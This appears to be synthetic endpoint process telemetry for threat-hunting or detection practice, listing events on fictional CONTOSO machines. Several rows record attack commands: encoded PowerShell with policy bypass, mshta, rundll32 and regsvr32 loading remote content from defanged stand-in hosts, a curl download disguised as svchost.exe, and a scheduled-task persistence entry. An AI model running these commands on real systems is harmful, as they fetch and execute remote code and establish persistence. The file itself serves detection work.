Timestamp,DeviceId,DeviceName,FileName,FolderPath,ProcessCommandLine,SHA1,MD5,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,AccountName,ReportId
2025-09-21T08:15:42Z,dbb2c8f4-44c1-4d3a-8a1a-0d9f5d9b1a01,WT4-LAPTOP-01,chrome.exe,C:\Program Files\Google\Chrome\Application,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer --profile-directory=Default",b3f1a9b4c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4,8d777f385d3dfec8815d20f7496026dc,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\kevin,10101
2025-09-21T08:17:09Z,dbb2c8f4-44c1-4d3a-8a1a-0d9f5d9b1a01,WT4-LAPTOP-01,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c whoami,2f1e2d3c4b5a69788776655443322110aa0bbcc1,45c48cce2e2d7fbdea1afc51c7c6ad26,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\kevin,10102
2025-09-21T08:20:31Z,a77ba1f3-0a9f-4a39-a8f4-0e1b2a3c4d55,WT4-SRV-API,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAAA...,0f1e2d3c4b5a69788776655443322110aa0bbcc1,e4d909c290d0fb1ca068ffaddf22cbd0,cmd.exe,C:\Windows\System32,"C:\Windows\System32\cmd.exe /c start """"",NT AUTHORITY\SYSTEM,20101
2025-09-21T08:22:14Z,a77ba1f3-0a9f-4a39-a8f4-0e1b2a3c4d55,WT4-SRV-API,mshta.exe,C:\Windows\System32,mshta.exe http://example[.]site/payload.hta,1a2b3c4d5e6f70819283746556473829a1b2c3d4,900150983cd24fb0d6963f7d28e17f72,w3wp.exe,C:\Windows\System32\inetsrv,C:\Windows\System32\inetsrv\w3wp.exe -ap MyAppPool,IIS APPPOOL\DefaultAppPool,20102
2025-09-21T08:24:03Z,5b0d1e7a-29cd-4707-8f8d-0e2d9a02b9cd,WT4-LAPTOP-02,notepad.exe,C:\Windows\System32,"""C:\Windows\System32\notepad.exe""",abcdefabcdefabcdefabcdefabcdefabcdefabcd,827ccb0eea8a706c4c34a16891f84e7b,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\alex,30101
2025-09-21T08:26:48Z,5b0d1e7a-29cd-4707-8f8d-0e2d9a02b9cd,WT4-LAPTOP-02,rundll32.exe,C:\Windows\System32,"rundll32.exe url.dll,FileProtocolHandler http://example[.]com/update",2222222222222222222222222222222222222222,d41d8cd98f00b204e9800998ecf8427e,explorer.exe,C:\Windows,C:\Windows\explorer.exe,CONTOSO\alex,30102
2025-09-21T08:28:12Z,c4e4a9f0-0f1b-4aa0-a9d2-6b7a9e2e55c1,WT4-DC-01,wmic.exe,C:\Windows\System32\wbem,"wmic process call create ""cmd /c ipconfig /all > C:\Windows\Temp\net.txt""",3333333333333333333333333333333333333333,5d41402abc4b2a76b9719d911017c592,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c wmic ...,NT AUTHORITY\SYSTEM,40101
2025-09-21T08:31:00Z,c4e4a9f0-0f1b-4aa0-a9d2-6b7a9e2e55c1,WT4-DC-01,regsvr32.exe,C:\Windows\System32,regsvr32.exe /s /u /n /i:http://example[.]cdn/file.sct scrobj.dll,4444444444444444444444444444444444444444,098f6bcd4621d373cade4e832627b4f6,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c regsvr32 ...,NT AUTHORITY\SYSTEM,40102
2025-09-21T08:33:27Z,f19e6b2e-6a21-4200-8b70-5b1b05c6e3f9,WT4-LAB-01,curl.exe,C:\Program Files\curl\bin,curl.exe -o C:\Users\Public\svchost.exe http://example[.]org/a.exe,5555555555555555555555555555555555555555,ad0234829205b9033196ba818f7a872b,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -nop -w hidden -c iwr ...,CONTOSO\labuser,50101
2025-09-21T08:35:10Z,f19e6b2e-6a21-4200-8b70-5b1b05c6e3f9,WT4-LAB-01,schtasks.exe,C:\Windows\System32,"schtasks.exe /Create /SC MINUTE /MO 30 /TN updater /TR ""C:\Users\Public\svchost.exe""",6666666666666666666666666666666666666666,8f14e45fceea167a5a36dedd4bea2543,cmd.exe,C:\Windows\System32,C:\Windows\System32\cmd.exe /c schtasks ...,CONTOSO\labuser,50102
